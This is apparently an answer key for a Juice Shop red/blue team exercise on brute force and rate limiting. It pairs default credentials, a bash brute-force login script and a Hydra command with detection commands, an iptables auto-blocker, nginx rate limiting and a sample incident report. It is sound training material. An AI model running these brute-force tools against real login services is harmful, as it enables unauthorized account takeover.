# Exercise 02 Answers: Brute Force & Rate Limiting

## 🔴 Red Team Answers

### Working Credentials Found

| Email | Password | Notes |
|-------|----------|-------|
| admin@juice-sh.op | admin123 | Default admin |
| jim@juice-sh.op | ncc-1701 | Star Trek reference |
| bender@juice-sh.op | OhG0dPlease1444ert! | Futurama reference |
| mc.safesearch@juice-sh.op | Mr. N00dles | |

### Complete Brute Force Script

```bash
#!/bin/bash
# brute_force_complete.sh
TARGET="http://<VPS_IP>:8000"

# Known users
USERS=("admin@juice-sh.op" "jim@juice-sh.op" "bender@juice-sh.op")

# Common passwords for Juice Shop
PASSWORDS=(
    "admin" "admin123" "password" "123456"
    "ncc-1701" "ncc-1701-d"  # Star Trek for Jim
    "bender" "rodriguez"     # Futurama for Bender
)

for email in "${USERS[@]}"; do
    echo "=== Attacking: $email ==="
    
    for password in "${PASSWORDS[@]}"; do
        RESPONSE=$(curl -s -X POST "$TARGET/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$email\",\"password\":\"$password\"}")
        
        if echo "$RESPONSE" | grep -q "token"; then
            echo "✓ SUCCESS: $email : $password"
            break
        fi
    done
done
```

### Hydra Command (Alternative)

```bash
hydra -L users.txt -P passwords.txt \
    <VPS_IP> http-post-form \
    "/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid" \
    -H "Content-Type: application/json"
```

---

## 🔵 Blue Team Answers

### Detection Commands

#### Real-Time Monitoring
```bash
# Watch all login attempts
tail -f ./logs/nginx/access.log | grep "POST /rest/user/login"

# Count failed logins
watch -n 5 'grep "POST /rest/user/login" ./logs/nginx/access.log | \
    grep " 401 " | wc -l'
```

#### Find Attacker
```bash
# Most active IPs on login endpoint
grep "POST /rest/user/login" ./logs/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -5
```

#### Kibana Queries
```
# Failed logins
message: *login* AND response:401

# Success after many failures (suspicious)
message: *login* AND response:200
```

### Complete Auto-Blocker Script

```bash
#!/bin/bash
# auto_blocker.sh

LOG="./logs/nginx/access.log"
MAX_ATTEMPTS=10
BLOCKED_FILE="/tmp/blocked_ips.txt"

touch $BLOCKED_FILE

while true; do
    echo "=== Scan $(date) ==="
    
    # Find IPs with too many failed logins
    grep "POST /rest/user/login" "$LOG" | grep " 401 " | \
        awk '{print $1}' | sort | uniq -c | \
        while read count ip; do
            if [ "$count" -gt "$MAX_ATTEMPTS" ]; then
                # Check if already blocked
                if ! grep -q "$ip" $BLOCKED_FILE; then
                    echo "⚠️  BLOCKING: $ip ($count failed attempts)"
                    sudo iptables -A INPUT -s "$ip" -j DROP
                    echo "$ip" >> $BLOCKED_FILE
                fi
            fi
        done
    
    sleep 10
done
```

### Rate Limiting Configuration

```nginx
# /etc/nginx/conf.d/rate_limit.conf

# Define rate limit zone
limit_req_zone $binary_remote_addr zone=login_limit:10m rate=5r/s;

# Apply to login endpoint
server {
    listen 80;
    
    location /rest/user/login {
        # Allow 5 requests/second, burst of 10
        limit_req zone=login_limit burst=10 nodelay;
        limit_req_status 429;
        
        proxy_pass http://juice-shop:3000;
    }
    
    location / {
        proxy_pass http://juice-shop:3000;
    }
}
```

### Sample Incident Report

```
BRUTE FORCE INCIDENT REPORT
===========================

Detection Time: 15:22
Attacker IP: 192.168.1.100
Attack Duration: 8 minutes

Attack Statistics:
- Total login attempts: 127
- Failed attempts: 124
- Successful logins: 3
- Accounts targeted: 5

Compromised Accounts:
1. admin@juice-sh.op
2. jim@juice-sh.op  
3. bender@juice-sh.op

Response Timeline:
- 15:22 - High volume of 401s detected
- 15:25 - Attack pattern confirmed (brute force)
- 15:28 - IP blocked via iptables
- 15:30 - Attack stopped

Immediate Actions:
- Force password reset for compromised accounts
- Check for unauthorized activity during attack window
- Review account permissions

Recommendations:
1. Implement account lockout (5 failed = 15 min lock)
2. Add CAPTCHA after 3 failed attempts
3. Implement 2FA for all accounts
4. Use rate limiting (5 requests/second max)
5. Add login anomaly alerting
```

---

## 🎓 Learning Points

### Attack Patterns to Detect

| Pattern | Meaning | Threshold |
|---------|---------|-----------|
| Many 401s, same IP | Brute force | >10/minute |
| Many 401s, rotating IPs | Distributed attack | >50 total |
| Different users, same password | Password spray | >5 users |
| Rapid requests (<100ms apart) | Automated tool | >10/second |

### Effective Defenses

1. **Account Lockout**
   - Lock after 5 failed attempts
   - Progressive delays (1min, 5min, 15min, 1hr)

2. **Rate Limiting**
   - 5 requests/second per IP
   - Burst allowance of 10

3. **CAPTCHA**
   - Show after 3 failed attempts
   - Required for new IPs

4. **Multi-Factor Authentication**
   - TOTP (Time-based One-Time Password)
   - Push notifications
   - Hardware keys

### Why Plain Passwords Fail

```
admin123  → Cracked in <1 second (common list)
ncc-1701  → Cracked in ~5 minutes (Star Trek list)
Complex   → May take hours/days (still risky)
```

**Solution:** Use password policies + rate limiting + 2FA
